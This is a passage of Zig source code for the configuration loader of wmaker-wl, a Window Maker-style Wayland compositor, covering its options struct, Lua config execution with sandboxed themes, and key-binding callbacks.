// SPDX-License-Identifier: GPL-3.0
//
// Configuration for wmaker-wl.
//
// This is the single source of truth for every tunable. Nothing else in
// the code base may hard-code a gap, border, colour or command.
//
// File: $XDG_CONFIG_HOME/wmaker-wl/config.lua
//       (falls back to ~/.config/wmaker-wl/config.lua)
//
// Format: a plain Lua script (Lua 5.4, built in through ziglua, see lua.zig). Options are
// global variables, key bindings and other files are function calls:
//
//     gap = 10
//     border_focused = "#d8a657"            -- or 0xd8a657
//     terminal = "alacritty --class foo"    -- or { "alacritty", "--class", "foo" }
//     bind("Super+Shift+h", "move_column_left")
//     bind("Super+Return", "spawn alacritty --class foo")
//     unbind("Super+q")
//
// The script runs on top of the built-in share/default_config.lua: whatever
// it does not set keeps the default. Being a real script it can also loop,
// compute and read the environment:
//
//     for i = 1, 9 do bind("Super+" .. i, "workspace " .. i) end
//
// Nothing in it can stop the session from starting: a Lua error, an unknown
// option or a bad value is a warning in the log (and counted in
// `parse_warnings`). A bad value is refused and the previous one stays; an
// error in the script ends the script at that point, what ran before it
// stays. Every option is readable before the script changes it (`gap = gap + 2`),
// and only what the script assigns counts as set. Any other global is the
// script's own variable; a name that is a small edit away from an option
// (`gapp = 8`) is reported with a suggestion, so typos do not go unnoticed.
// A script that runs for far too long (endless loop) is aborted.
//
// `bind("Super+x", function() ... end)` runs a Lua function. Inside it
// `run("workspace 2")` (any bind command), `spawn("foot")` and
// `shell("a | b")` work; they are refused anywhere else. The config's Lua
// state then stays alive (`Config.script`) until the config is replaced.
//
// An option is a field of `Config`: how a value is read from Lua, handed
// back to Lua and checked follows from the field's type (see "the option
// table" below). Adding an option is one field here plus its line in
// share/default_config.lua.
//
// Key names are resolved through xkbcommon, so they are layout-correct.
// Bindings are matched against the *active* layout (keys.zig); no manual QWERTZ /
// AZERTY remapping is needed (the old layoutMapKeysym() was wrong).
//
// A key can be named by its keysym (`Return`, `udiaeresis`, `U00FC`) or, for
// a single character, by that character itself (`Super+ü`, `Super+ß`) --
// handy on a German layout, where the key labelled ü has no ASCII name.
//
// `include("FILE")` runs another file at that point, in the same script
// (so later lines override it); `theme("NAME")` reads Themes/NAME.lua,
// restricted to the look options (colours, border width, gaps) and run with
// an EMPTY environment -- a theme sees no function at all, so it can never
// bind a key, start a program or touch a file. See `themeInto`.
//
// By default a binding is translated with whichever layout is active at the
// moment. `bind_layout = 0` (or 1, 2, 3) pins all bindings to that layout of
// the keyboard instead, so a binding written as `Super+q` keeps working
// after switching from `us` to `de` and back (keys.zig).
// set_layout_override). `bind_layout = "current"` follows the active one.

const std = @import("std");
const log = std.log.scoped(.config);
const xkb = @import("xkbcommon");
const animation = @import("animation.zig");
const backend = @import("backend.zig");

pub const Modifiers = backend.Modifiers;

pub const Bind = struct {
    mods: Modifiers,
    keysym: u32,
    /// Raw command text, e.g. "focus_left" or "workspace 2". Parsed by
    /// action.parse() so config.zig stays independent of action.zig.
    command: []const u8,
};

pub const CenterMode = enum {
    /// Scroll the minimum amount that brings the focused column into view.
    on_overflow,
    /// Always keep the focused column centred.
    always,
    /// Never scroll on focus change.
    never,
};

pub const NewWindowMode = enum {
    /// Open new windows in a fresh column right of the focused one.
    new_column,
    /// Stack new windows into the focused column.
    stack,
};

/// Which screen edge the Dock (Window Maker's WMDock) sits on.
pub const DockEdge = enum { left, right };

/// Which screen corner the Clip (Window Maker's WMClip) sits in.
pub const ClipCorner = enum { top_left, top_right, bottom_left, bottom_right };

/// Where a submenu opens relative to its parent menu.
pub const SubmenuAlign = enum { right, left };

/// Window Maker's `IconificationStyle`: what a window does on its way to the
/// Dock when it is minimized and back when it is restored (anim.zig).
/// `random` picks one of the three for every window.
pub const IconifyStyle = enum { zoom, twist, flip, none, random };

/// Longest Pango font description accepted for the `font_*` options.
pub const max_font_len = 63;

/// Hard upper bound; Output holds workspaces in a fixed array.
pub const max_workspaces = 16;

/// Upper bound for every pixel-valued option (gaps, border, sizes, offsets).
/// The layout multiplies and sums these per column and window; an absurd
/// value such as `gap = 2000000000` would overflow `i32` there and crash the
/// window manager, so it is refused when the file is read instead.
pub const max_pixels: i32 = 10_000;
/// Allowed range of `dock_size` (px per tile).
pub const min_dock_size: i32 = 16;
pub const max_dock_size: i32 = 256;

/// xkbcommon allows at most four layouts per keymap.
pub const max_bind_layouts = 4;

/// Dock/Clip options that the saved Dock state (WMState, see wm_files.zig)
/// can also set. `true` = the user's own config.lua names the option, and
/// then the config wins over the saved state; an option the user never wrote
/// down is taken from the saved state (what was last changed with the mouse).
/// The built-in defaults never count as "written down".
pub const Explicit = struct {
    dock_edge: bool = false,
    dock_offset: bool = false,
    dock_on_top: bool = false,
    dock_auto_raise: bool = false,
    clip_corner: bool = false,
    clip_on_top: bool = false,
    clip_collapsed: bool = false,
    clip_auto_collapse: bool = false,
    clip_auto_raise: bool = false,
};

/// One `environment = { NAME = "value" }` entry.
pub const EnvVar = struct { name: []const u8, value: []const u8 };

pub const max_startup_commands = 64;
pub const max_env_vars = 64;

/// A valid environment variable name: [A-Za-z_][A-Za-z0-9_]*, at most 128.
pub fn validEnvName(name: []const u8) bool {
    if (name.len == 0 or name.len > 128) return false;
    for (name, 0..) |ch, i| {
        const ok = std.ascii.isAlphabetic(ch) or ch == '_' or (i > 0 and std.ascii.isDigit(ch));
        if (!ok) return false;
    }
    return true;
}

pub const Config = struct {
    arena: std.heap.ArenaAllocator,
    config_file: []const u8 = "(built-in defaults)",
    /// Which Dock/Clip options config.lua sets itself, see `Explicit`.
    explicit: Explicit = .{},

    // ---- layout ---------------------------------------------------------
    gap: i32 = 8,
    outer_gap: i32 = 8,
    default_column_width: f64 = 0.5,
    width_presets: []const f64 = &.{ 1.0 / 3.0, 0.5, 2.0 / 3.0, 1.0 },
    width_step: f64 = 0.1,
    min_window_size: i32 = 120,
    center_focused_column: CenterMode = .on_overflow,
    new_window: NewWindowMode = .new_column,

    /// Extra space kept free on each side of the work area.
    strut_left: i32 = 0,
    strut_right: i32 = 0,
    strut_top: i32 = 0,
    strut_bottom: i32 = 0,
    /// A lone column that does not fill
    /// the work area sits in the middle instead of at the left edge.
    center_single_column: bool = false,
    /// While the active column is maximized (`maximize_column`) the view stays
    /// locked on it, on every layout pass, not only when focus changes.
    maximize_follow: bool = true,
    /// A new tiled window does not take the focus from a maximized window
    /// (it opens in the background, next to the maximized column).
    maximize_keep_focus: bool = false,

    // ---- animations (animation.zig) --------------------------------------------
    /// Master switch. false: windows jump, as before.
    animations: bool = true,
    /// Every animation runs this many times slower (2 = half speed); useful
    /// to see what they do. Smaller than 1 = faster.
    anim_slowdown: f64 = 1.0,
    /// A tiled window that moves (a column opens or closes next to it, the
    /// view scrolls, a column is resized): how it travels to its new place.
    anim_window_movement: animation.Spec = animation.Spec.default_movement,
    /// A window that opens: how it is uncovered.
    anim_window_open: animation.Spec = animation.Spec.default_open,

    // ---- look -----------------------------------------------------------
    border_width: i32 = 2,
    border_focused: u32 = 0xd8a657,
    border_unfocused: u32 = 0x3c3836,
    border_floating: u32 = 0x7daea3,

    // ---- look of the Dock, the Clip and the Drawers (style.zig) -------------
    // Window Maker's NeXT look. A tile is a diagonal gradient `from` -> `to`
    // with a two-line bevel; `hot` is the tile under the pointer.
    tile_from: u32 = 0xc6c2c6,
    tile_to: u32 = 0x9a969a,
    tile_hot_from: u32 = 0xdedade,
    tile_hot_to: u32 = 0xaeaaae,
    logo_from: u32 = 0x5a5a62,
    logo_to: u32 = 0x1e1e24,
    logo_text: u32 = 0xffffff,
    tile_text: u32 = 0x000000,
    bevel_light: u32 = 0xffffff,
    bevel_dark: u32 = 0x555555,
    arrow: u32 = 0x303030,
    arrow_hot: u32 = 0xffffff,

    // ---- fonts (Pango font descriptions, e.g. "Sans Bold 10") --------------
    /// Title bar of a menu.
    font_menu_title: [:0]const u8 = "Sans Bold 10",
    /// Rows of a menu.
    font_menu: [:0]const u8 = "Sans 10",
    /// The small workspace name under the number in the Clip.
    font_dock: [:0]const u8 = "Sans 8",
    /// The "WM" of the Dock's first tile, and the big workspace number of the Clip.
    font_dock_logo: [:0]const u8 = "Sans Bold 22",
    font_dock_number: [:0]const u8 = "Sans Bold 20",

    // ---- menus ----------------------------------------------------------
    /// Which side of its parent a submenu opens on first. It flips to the
    /// other side when it would leave the screen.
    menu_submenu_align: SubmenuAlign = .right,

    // ---- windows / focus --------------------------------------------------
    /// A new window takes the keyboard focus (and the view scrolls to it).
    /// false: it opens in the background and the focus stays where it is.
    focus_new_windows: bool = true,

    // ---- workspaces -----------------------------------------------------
    workspace_count: u32 = 4,
    /// Order of the monitors for `focus_output_next` and friends: `position`
    /// (left to right) or `connection` (the order they were announced in).
    output_order: monitors.Order = .position,
    /// A change of the monitors counts after this many ms without another
    /// one (hot-plugging announces them one after the other).
    monitor_settle_ms: u32 = 400,
    /// `monitor("DP-1", { ... })` and `monitor_profile{ ... }`, see monitors.zig.
    /// Appended to while config.lua (and what it includes) runs; the strings
    /// live in the config arena.
    monitor_rules: std.ArrayList(monitors.Rule) = .empty,
    monitor_profiles: std.ArrayList(monitors.Profile) = .empty,
    /// workspace_next on the last workspace goes to the first, and
    /// workspace_prev on the first goes to the last. false: they stop.
    workspace_wrap: bool = true,
    /// The mouse wheel over the Clip switches workspace.
    clip_scroll_workspaces: bool = true,
    /// `workspace N` for the workspace that is shown goes back to the one
    /// before.
    workspace_back_and_forth: bool = false,
    /// Dynamic workspaces: there is always one empty workspace at
    /// the end, and empty ones behind it disappear. `workspace_count` is then
    /// the number that always exists.
    dynamic_workspaces: bool = false,

    // ---- floating / mouse -----------------------------------------------
    /// Pixels a tiled window must be dragged before it detaches into the
    /// floating layer. Prevents an accidental click-drag from wrecking
    /// the layout.
    drag_threshold: i32 = 24,
    /// Size of a fresh floating window as a fraction of the output.
    floating_size: f64 = 0.6,
    focus_follows_mouse: bool = false,
    /// With `focus_follows_mouse`: focusing a window by pointing at it also
    /// scrolls the view to it. false: the view stays where it is.
    focus_follows_mouse_scroll: bool = true,
    /// After a keyboard focus change the pointer
    /// jumps into the newly focused window.
    warp_mouse_to_focus: bool = false,
    /// Ask clients to leave out their own title bars.
    prefer_no_csd: bool = true,
    /// Modifier for mouse move/resize (Mod+LMB / Mod+RMB).
    mouse_mod: Modifiers = .{ .mod4 = true },

    // ---- programs -------------------------------------------------------
    terminal: []const []const u8 = &.{"alacritty"},
    launcher: []const []const u8 = &.{"fuzzel"},
    browser: []const []const u8 = &.{"firefox"},

    /// Run once at session start (not on reload).
    spawn_at_startup: []const []const []const u8 = &.{},
    /// Set in wmaker-wl's own environment, so every
    /// program it starts inherits it.
    environment: []const EnvVar = &.{},
    /// At session start tell D-Bus and `systemd --user` about WAYLAND_DISPLAY
    /// and friends (boot.importEnvironment), so portals and notification
    /// daemons find the compositor.
    import_environment: bool = true,

    // ---- key bindings ---------------------------------------------------
    binds: []const Bind = &.{},

    // ---- WindowMaker compatibility --------------------------------------
    /// Also read Window Maker's own files (~/GNUstep/Defaults/WMRootMenu,
    /// WMWindowAttributes, ...). Files in ~/.config/wmaker-wl always win.
    enable_wmaker_compat: bool = true,

    // ---- session ----------------------------------------------------------
    /// Run the autostart script once when the session comes up, exactly
    /// like Window Maker: ~/.config/wmaker-wl/autostart, falling back to
    /// ~/GNUstep/Library/WindowMaker/autostart when enable_wmaker_compat
    /// allows it. Neither needs to exist; a missing script is a no-op.
    enable_autostart: bool = true,

    /// Problems found while reading the config (Lua error, unknown option,
    /// bad value, missing include, a theme using an option themes may not
    /// use). The shipped files are tested to have none.
    parse_warnings: u32 = 0,

    // ---- keyboard -------------------------------------------------------------
    /// null: bindings follow the active xkb layout. N: always translate key
    /// events with layout N (0-based) of the keyboard that produced them.
    bind_layout: ?u32 = null,
    /// Auto-repeat of held keys, as clients get it (keys per second, 0 = off)
    /// and as wmaker-wl repeats the binds that make sense to repeat.
    repeat_rate: u32 = 25,
    /// Milliseconds a key is held until the repeat starts.
    repeat_delay: u32 = 600,
    /// false: a bind fires once per press, however long the key is held.
    repeat_binds: bool = true,

    // ---- Dock and Clip (dock_model.zig, dock_scene.zig) --------------------------
    /// Draw the Dock: a column of tiles on one screen edge. Its first tile is
    /// the Window Maker logo tile, the others are the DockApps of WMState.
    dock_enabled: bool = true,
    /// Edge length of one Dock/Clip tile in px (Window Maker's icon size,
    /// default 64). The icon inside is 3/4 of it.
    dock_size: i32 = 64,
    dock_edge: DockEdge = .right,
    /// Distance of the Dock's top edge from the top of the screen, in px.
    dock_offset: i32 = 0,
    /// true: the Dock is drawn above windows (Window Maker's "Keep on top");
    /// false: below them ("Lowered").
    dock_on_top: bool = true,
    /// Window Maker's "Auto raise & lower" (Dock position menu): only
    /// counts while `dock_on_top` is off. The Dock then sits below windows
    /// and comes up while the pointer is on it. (The Dock menu sets the level at
    /// run time; it is saved in WMState.)
    dock_auto_raise: bool = false,
    /// Launch with ONE click on a Dock/Clip tile. Window Maker's default is
    /// a double click (a single click only raises the Dock), which is also
    /// the default here.
    dock_single_click: bool = false,
    /// Save moved/added/removed tiles and the Dock/Clip switches to the
    /// state file (see docs/DOCKAPPS.md) and read it back at start-up.
    dock_save_state: bool = true,
    /// Shrink the usable area by the Dock's width so tiled windows never end
    /// up under it. Ignored while the Dock is lowered.
    dock_reserve_space: bool = true,
    /// Draw the Clip: one tile with workspace arrows plus the DockApps whose
    /// `place = clip` belongs to the current workspace.
    clip_enabled: bool = true,
    clip_corner: ClipCorner = .top_left,
    clip_on_top: bool = true,
    /// Start with only the Clip tile shown, without its workspace icons.
    clip_collapsed: bool = false,
    /// Every minimized window gets a temporary tile (its program's icon) in
    /// the Dock, until it is restored (see dockhost.zig). The
    /// `toggle_mini_dock` command flips it at run time (a config reload sets
    /// it back to this value).
    mini_dock: bool = true,
    /// Animation of a window going to its Dock tile and coming back
    /// (Window Maker's IconificationStyle: zoom, twist, flip, none, random).
    iconify_style: IconifyStyle = .twist,
    /// Window Maker's "Autocollapse": the Clip folds up when the pointer
    /// leaves it and unfolds when it comes back.
    clip_auto_collapse: bool = false,
    /// Window Maker's "Autoraise": a Clip that is not `clip_on_top` comes up
    /// while the pointer is on it.
    clip_auto_raise: bool = false,
    /// Workspace names, in order. Missing/empty entries are shown as just
    /// the workspace number. Without this option the names of Window
    /// Maker's WMState (if read) are used.
    workspace_names: []const []const u8 = &.{},

    // ---- dock apps ----------------------------------------------------------
    /// Run every `autolaunch = yes` DockApp once when the session comes up
    /// (see dockapp.zig). Looked up first as
    /// $XDG_STATE_HOME/wmaker-wl/WMState, then (if enable_wmaker_compat
    /// allows it) parsed out of Window Maker's own
    /// ~/GNUstep/Defaults/WMState. Neither needs to exist.
    enable_dockapps: bool = true,

    /// The Lua state of config.lua, kept alive after the script ran only if
    /// it bound Lua functions (`bind(combo, function)`): they live in it.
    script: ?*lua.State = null,

    pub fn deinit(cfg: *Config) void {
        if (cfg.script) |L| lua.close(L);
        cfg.script = null;
        cfg.arena.deinit();
    }
};

const monitors = @import("monitors.zig");
const lua = @import("lua.zig");

const default_config_text = @embedFile("share/default_config.lua");

/// The built-in default config.lua (`wmaker-wl --print-config`).
pub const builtin_text = default_config_text;

/// `--config FILE`: read this file instead of the default config.lua.
pub var config_path_override: ?[]const u8 = null;

/// `--config-dir DIR`: wmaker-wl's own directory (config.lua, RootMenu,
/// WMWindowAttributes, autostart) is DIR instead of
/// $XDG_CONFIG_HOME/wmaker-wl. `--config` still wins for config.lua itself.
pub var config_dir_override: ?[]const u8 = null;

/// Load configuration. Only fails on out-of-memory: a broken or missing
/// user file falls back to the built-in defaults (with warnings), so the
/// session always starts.
pub fn load(io: std.Io, gpa: std.mem.Allocator) !Config {
    var cfg: Config = .{ .arena = .init(gpa) };
    errdefer cfg.deinit();
    const a = cfg.arena.allocator();

    var binds: std.ArrayList(Bind) = .empty;
    try parse(a, default_config_text, &cfg, &binds, "<built-in>");
    cfg.parse_warnings = 0; // the built-in file is tested; only the user's count

    if (try userConfigPath(a)) |path| {
        if (std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), io, path, a, .limited(1 << 20))) |text| {
            cfg.config_file = path;
            var reader: FileReader = .{ .io = io };
            const inc: Includer = .{
                .ctx = &reader,
                .read = FileReader.read,
                .dir = std.fs.path.dirname(path) orelse ".",
            };
            try parseWith(a, text, &cfg, &binds, path, &inc, false);
        } else |err| {
            log.info("no user config at {s} ({t}); using defaults", .{ path, err });
        }
        warnLegacyConfig(io, a, path);
    }

    cfg.binds = try binds.toOwnedSlice(a);
    return cfg;
}

/// Before the move to Lua the file was `config.conf` (`key = value` lines).
/// It is not read any more (and neither does anything else pick it up), so
/// say so instead of silently ignoring a file the user, or an older wlprefs,
/// wrote: that looks exactly like "my config is not loaded".
fn warnLegacyConfig(io: std.Io, a: std.mem.Allocator, lua_path: []const u8) void {
    const dir = std.fs.path.dirname(lua_path) orelse return;
    const old = std.fmt.allocPrint(a, "{s}/config.conf", .{dir}) catch return;
    if (std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), io, old, a, .limited(1 << 20))) |_| {
        log.warn("{s} is NOT read any more: the config is now {s} (Lua, see share/default_config.lua)", .{ old, lua_path });
    } else |_| {}
}

pub fn userConfigPath(a: std.mem.Allocator) !?[]const u8 {
    if (config_path_override) |p| return p;
    if (config_dir_override) |d| {
        return try std.fmt.allocPrint(a, "{s}/config.lua", .{std.mem.trimEnd(u8, d, "/")});
    }
    if (std.c.getenv("XDG_CONFIG_HOME")) |x| {
        const dir = std.mem.span(x);
        if (dir.len > 0) return try std.fmt.allocPrint(a, "{s}/wmaker-wl/config.lua", .{dir});
    }
    if (std.c.getenv("HOME")) |h| {
        return try std.fmt.allocPrint(a, "{s}/.config/wmaker-wl/config.lua", .{std.mem.span(h)});
    }
    return null;
}

// ----------------------------------------------------------------------------
// Running the script
// ----------------------------------------------------------------------------

/// Reads the files `include`/`theme` name. A callback so that parsing stays
/// free of file-system access (and testable with a map of fake files).
pub const Includer = struct {
    ctx: *anyopaque,
    /// The contents of `path` (allocated in `a`), or null if it cannot be
    /// read.
    read: *const fn (ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8,
    /// Directory of the file being parsed: relative includes and Themes/
    /// are looked up from here.
    dir: []const u8,
    depth: u8 = 0,
};

pub const max_include_depth = 4;

/// VM instructions a script may execute before it is aborted. A real config
/// needs a few thousand; this only exists so that an endless loop cannot
/// hang the session (about a second of Lua).
const max_script_instructions = 50_000_000;

/// Where a theme is looked for besides next to the config.
const theme_dirs = [_][]const u8{ "/usr/local/share/wmaker-wl/Themes", "/usr/share/wmaker-wl/Themes" };

/// The options a theme may set: how things look, nothing that does anything.
fn themeKey(key: []const u8) bool {
    inline for (all_options) |name| {
        if (std.mem.eql(u8, key, name)) return comptime isLook(name);
    }
    return false;
}

const FileReader = struct {
    io: std.Io,

    fn read(ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8 {
        const self: *FileReader = @ptrCast(@alignCast(ctx));
        return std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), self.io, path, a, .limited(1 << 20)) catch null;
    }
};

/// A theme name is a file name: letters, digits, `_`, `-`, `.`; never a path.
pub fn validThemeName(name: []const u8) bool {
    if (name.len == 0 or name.len > 64 or name[0] == '.') return false;
    for (name) |ch| {
        if (!std.ascii.isAlphanumeric(ch) and ch != '_' and ch != '-' and ch != '.') return false;
    }
    return std.mem.indexOf(u8, name, "..") == null;
}

/// Everything one run of a config script needs. The Lua callbacks (bind,
/// include, ...) are plain C functions without user data, so the run in
/// progress is reached through `active`.
const Ctx = struct {
    L: *lua.State,
    a: std.mem.Allocator,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    /// Name used in messages about the whole script (not about one line).
    origin: []const u8,
    inc: ?*const Includer,
    /// Directory of the file being run: relative includes and Themes/ start here.
    dir: []const u8,
    depth: u8,
    /// The script is the user's own (not the built-in defaults): the Dock/Clip
    /// options it names count as written down, see `Explicit`.
    user_script: bool,
    /// An allocation failed inside a Lua callback (which cannot return an
    /// error); parseWith reports it when the script is done.
    oom: bool = false,
    /// Registry reference of the table holding the options' values from
    /// before the script ran (what the script reads for an option it has
    /// not assigned), see `presetOptions`.
    preset_ref: i32 = 0,
    /// How many Lua functions the script bound to keys. Any: the state stays.
    callbacks: u32 = 0,

    fn warn(ctx: *Ctx, comptime fmt: []const u8, args: anytype) void {
        log.warn(fmt, args);
        ctx.cfg.parse_warnings += 1;
    }

    /// A warning with the "file:line:" of the Lua code that made the call.
    fn warnAt(ctx: *Ctx, comptime fmt: []const u8, args: anytype) void {
        var buf: [512]u8 = undefined;
        const msg = std.fmt.bufPrint(&buf, fmt, args) catch "(message too long)";
        const loc = lua.where(ctx.L);
        log.warn("{s}{s}", .{ loc, msg });
        lua.pop(ctx.L, 1);
        ctx.cfg.parse_warnings += 1;
    }

    fn print(ctx: *Ctx, comptime fmt: []const u8, args: anytype) ?[]u8 {
        return std.fmt.allocPrint(ctx.a, fmt, args) catch {
            ctx.oom = true;
            return null;
        };
    }
};

threadlocal var active: ?*Ctx = null;

const StringSet = std.StringHashMapUnmanaged(void);

pub fn parse(
    a: std.mem.Allocator,
    text: []const u8,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    origin: []const u8,
) !void {
    return parseWith(a, text, cfg, binds, origin, null, false);
}

/// Run the Lua script `text` and apply what it set to `cfg` / `binds`.
///
/// `inc` null: `include`/`theme` are refused (a warning). `theme_only`: the
/// text comes from a theme, so it runs with an empty environment and only
/// look options are accepted.
pub fn parseWith(
    a: std.mem.Allocator,
    text: []const u8,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    origin: []const u8,
    inc: ?*const Includer,
    theme_only: bool,
) std.mem.Allocator.Error!void {
    const L = lua.newState() orelse return error.OutOfMemory;
    var keep_state = false; // see Config.script
    defer if (!keep_state) lua.close(L);
    lua.limitInstructions(L, max_script_instructions);

    var ctx: Ctx = .{
        .L = L,
        .a = a,
        .cfg = cfg,
        .binds = binds,
        .origin = origin,
        .inc = inc,
        .dir = if (inc) |i| i.dir else ".",
        .depth = if (inc) |i| i.depth else 0,
        .user_script = origin.len > 0 and origin[0] != '<',
    };
    const outer = active;
    active = &ctx;
    defer active = outer;

    // Names that exist before the script runs (the standard library and our
    // functions): everything else the script creates is an option.
    var baseline: StringSet = .empty;

    if (theme_only) {
        themeInto(&ctx, text, origin);
    } else {
        lua.openLibs(L);
        lua.harden(L);
        lua.register(L, "bind", cBind);
        lua.register(L, "unbind", cUnbind);
        lua.register(L, "include", cInclude);
        lua.register(L, "monitor", cMonitor);
        lua.register(L, "monitor_profile", cMonitorProfile);
        lua.register(L, "theme", cTheme);
        lua.register(L, "run", cRun);
        lua.register(L, "spawn", cSpawn);
        lua.register(L, "shell", cShell);
        try snapshotGlobals(&ctx, &baseline);
        try presetOptions(&ctx);
        runChunk(&ctx, text, origin);
    }

    try applyGlobals(&ctx, &baseline);
    if (!theme_only) try applyChangedTables(&ctx);
    if (ctx.oom) return error.OutOfMemory;

    // Lua functions bound to keys live in this state: the config keeps it.
    if (ctx.callbacks > 0) {
        if (cfg.script) |old| lua.close(old);
        cfg.script = L;
        keep_state = true;
    }
}

/// Chunk name for messages: "@file" shows as "file:LINE:", "=<name>" as is.
fn chunkName(ctx: *Ctx, origin: []const u8) ?[:0]const u8 {
    const prefix: u8 = if (origin.len > 0 and origin[0] == '<') '=' else '@';
    const name = std.fmt.allocPrintSentinel(ctx.a, "{c}{s}", .{ prefix, origin }, 0) catch {
        ctx.oom = true;
        return null;
    };
    return name;
}

/// The error message on top of the Lua stack becomes a warning.
fn luaFailed(ctx: *Ctx) void {
    const msg = lua.toSlice(ctx.L, -1) orelse "(error object is not a string)";
    ctx.warn("{s}", .{msg});
    lua.pop(ctx.L, 1);
}

/// Run `text` in the script's own environment. The stack stays balanced.
fn runChunk(ctx: *Ctx, raw_text: []const u8, origin: []const u8) void {
    const name = chunkName(ctx, origin) orelse return;
    // Editors on other systems like to start a file with a UTF-8 byte order
    // mark; Lua's loader for strings (unlike its file loader) chokes on it.
    const text = if (std.mem.startsWith(u8, raw_text, "\xEF\xBB\xBF")) raw_text[3..] else raw_text;
    if (!lua.load(ctx.L, text, name)) return luaFailed(ctx);
    if (!lua.call(ctx.L)) luaFailed(ctx);
}

/// Run a theme with an EMPTY environment (a fresh table: no `print`, no
/// `os`, not even `bind`), then copy the look options it set into the
/// script's globals, where later lines of the script override them and
/// earlier ones are overridden. Anything else it set is a warning. A theme
/// that fails halfway is dropped as a whole.
fn themeInto(ctx: *Ctx, text: []const u8, origin: []const u8) void {
    const L = ctx.L;
    const name = chunkName(ctx, origin) orelse return;

    lua.newTable(L); //                              [env]
    if (!lua.load(L, text, name)) { //               [env, func] / [env, msg]
        luaFailed(ctx);
        lua.pop(L, 1);
        return;
    }
    lua.pushValue(L, -2); //                         [env, func, env]
    if (!lua.setEnv(L, -2)) { //                     [env, func]
        lua.pop(L, 3);
        return;
    }
    if (!lua.call(L)) { //                           [env] / [env, msg]
        luaFailed(ctx);
        lua.pop(L, 1);
        return;
    }

    lua.pushNil(L);
    while (lua.next(L, -2)) { //                     [env, key, value]
        copyThemeEntry(ctx, origin);
        lua.pop(L, 1);
    }
    lua.pop(L, 1); //                                []
}

/// Stack: [.., key, value]. Leaves it as it found it.
fn copyThemeEntry(ctx: *Ctx, origin: []const u8) void {
    const L = ctx.L;
    const key = lua.toSlice(L, -2) orelse {
        ctx.warn("{s}: a theme sets named options only", .{origin});
        return;
    };
    if (!themeKey(key)) {
        ctx.warn("{s}: `{s}` is not a theme option (themes set colours, fonts, borders and gaps only)", .{ origin, key });
        return;
    }
    lua.pushGlobals(L); //       [key, value, G]
    lua.pushValue(L, -3); //     [key, value, G, key]
    lua.pushValue(L, -3); //     [key, value, G, key, value]
    lua.rawSet(L, -3); //        G[key] = value        [key, value, G]
    lua.pop(L, 1);
}

// ---- the functions a script can call ---------------------------------------
//
// They never raise a Lua error (that would longjmp across Zig frames): a
// problem is a warning with the script's file and line, and the call is a
// no-op.

fn cBind(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    const combo = lua.toSlice(L, 1);
    if (combo != null and lua.typeOf(L, 2) == lua.T_FUNCTION) return bindFunction(ctx, combo.?);
    const command = lua.toSlice(L, 2);
    if (combo == null or command == null) {
        ctx.warnAt("bind() takes a key and a command: bind(\"Super+q\", \"close\") or bind(\"Super+q\", function() ... end)", .{});
        return 0;
    }
    addBind(ctx.a, ctx.binds, combo.?, command.?) catch |err| switch (err) {
        error.OutOfMemory => ctx.oom = true,
        error.Invalid => ctx.warnAt("bad bind: `{s}`, `{s}`", .{ combo.?, command.? }),
    };
    return 0;
}

/// `bind(combo, function)`: the function is kept in the registry and the
/// bind's command text is `lua N` (N = its reference), see `callLua`.
fn bindFunction(ctx: *Ctx, combo: []const u8) i32 {
    const L = ctx.L;
    // Check the key first, so a bad one does not leave a reference behind.
    var probe: std.ArrayList(Bind) = .empty;
    var buf: [256]u8 = undefined;
    var fba = std.heap.FixedBufferAllocator.init(&buf);
    addBind(fba.allocator(), &probe, combo, "x") catch {
        ctx.warnAt("bad bind: `{s}` is not a key combination", .{combo});
        return 0;
    };
    lua.pushValue(L, 2);
    const ref = lua.makeRef(L);
    const text = ctx.print("lua {d}", .{ref}) orelse return 0;
    addBind(ctx.a, ctx.binds, combo, text) catch |err| switch (err) {
        error.OutOfMemory => ctx.oom = true,
        error.Invalid => ctx.warnAt("bad bind: `{s}`", .{combo}),
    };
    ctx.callbacks += 1;
    return 0;
}

// ---- monitor(), monitor_profile() ---------------------------------------------

const monitor_keys = [_][]const u8{ "enabled", "primary", "workspaces", "start_workspace", "restore_windows", "on_connect", "on_disconnect" };
const profile_keys = [_][]const u8{ "name", "needs", "exact", "run" };

/// Warn about keys of the table at `idx` that are not in `known` (a typo in
/// a monitor rule would otherwise silently do nothing).
fn warnUnknownKeys(ctx: *Ctx, idx: i32, known: []const []const u8, what: []const u8) void {
    const L = ctx.L;
    lua.pushNil(L);
    while (lua.next(L, idx)) {
        const k = lua.toSlice(L, -2);
        var ok = false;
        if (k) |name| for (known) |kn| {
            if (std.mem.eql(u8, name, kn)) ok = true;
        };
        if (!ok) ctx.warnAt("{s}: unknown key `{s}`", .{ what, k orelse "(not a string)" });
        lua.pop(L, 1);
    }
}

fn optBool(L: *lua.State, idx: i32, key: []const u8) error{Invalid}!?bool {
    lua.rawGetString(L, idx, key);
    defer lua.pop(L, 1);
    if (lua.typeOf(L, -1) == lua.T_NIL) return null;
    return lua.toBool(L, -1) orelse error.Invalid;
}

/// A whole number from 1 to `max`, as the 0-based index.
fn optIndex(L: *lua.State, idx: i32, key: []const u8, max: u32) error{Invalid}!?u32 {
    lua.rawGetString(L, idx, key);
    defer lua.pop(L, 1);
    if (lua.typeOf(L, -1) == lua.T_NIL) return null;
    const v = lua.toInteger(L, -1) orelse return error.Invalid;
    if (v < 1 or v > max) return error.Invalid;
    return @intCast(v - 1);
}

/// A command (string or table of strings) in field `key`; empty when absent.
fn optCommand(ctx: *Ctx, idx: i32, key: []const u8) ParseError![]const []const u8 {
    const L = ctx.L;
    lua.rawGetString(L, idx, key);
    defer lua.pop(L, 1);
    if (lua.typeOf(L, -1) == lua.T_NIL) return &.{};
    return commandValue(ctx);
}

/// `monitor("DP-1", { primary = true, workspaces = 6 })`: what to do with the
/// monitors a name matches (connector, "make model", or part of the
/// description; "*" is every monitor). See monitors.zig.
fn cMonitor(L: *lua.State) i32 {
    const ctx = active orelse return 0;
    const match = lua.toSlice(L, 1);
    if (match == null or match.?.len == 0 or lua.typeOf(L, 2) != lua.T_TABLE) {
